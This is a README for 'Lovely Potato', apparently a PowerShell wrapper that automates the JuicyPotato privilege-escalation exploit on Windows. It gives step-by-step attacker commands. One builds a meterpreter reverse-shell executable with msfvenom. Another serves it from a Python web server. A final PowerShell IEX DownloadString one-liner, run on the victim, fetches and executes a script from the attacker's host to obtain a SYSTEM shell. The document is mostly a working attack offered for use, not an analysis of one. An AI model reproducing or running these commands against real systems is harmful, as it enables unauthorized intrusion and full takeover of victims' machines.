# Lovely Potato (automating juicy potato)
*Powershell wrapper of [Decoder's JuicyPotato][1] for easy exploitation. **This entirely depends on the [original Juicy Potato binary][2] and utilizes his [test_clsid.bat][3]***

## Quick Guide
First clone this repo to your attacker machine which should include all required dependencies:
```
root@attacker:~# git clone https://github.com/TsukiCTF/Lovely-Potato.git
root@attacker:~# cd Lovely-Potato
```
Then modify the two following variables in 'Invoke-LovelyPotato.ps1' as below (attacker machine IP, writable path on the victim machine):
```
$RemoteDir = "http://[AttackerIP]
$LocalPath = "[WritablePathOnVictimMachine]"
```
Now create a meterpreter binary on the attacker machine or use any other executable reverse shell:
```
root@attacker:~/Lovely-Potato# msfvenom -p windows/meterpreter/reverset_tcp LHOST=[AttackerIP] LPORT=[AttackerPort] -f exe -o meterpreter.exe
```
Start a web server in this repo to serve your meterpreter.exe and other dependencies:
```
root@attacker:~/Lovely-Potato# python3 -m http.server 80
```
On a new terminal, launch metasploit console (or any listener which handles whatever you are serving as a reverse shell):
I'm going to omit setting up the MSF multi handler as it's something you should already know.
```
root@attacker:~# msfdb run
```
Finally enter below command on victim's powershell console and wait 5 minutes for reverse shell running as user NT AUTHORITY\SYSTEM!!
```
PS > IEX(New-Object Net.WebClient).DownloadString('http://[AttackerIP]/Invoke-LovelyPotato.ps1')
```

## References

[1]: https://github.com/ohpe/juicy-potato
[2]: https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts
[3]: https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat
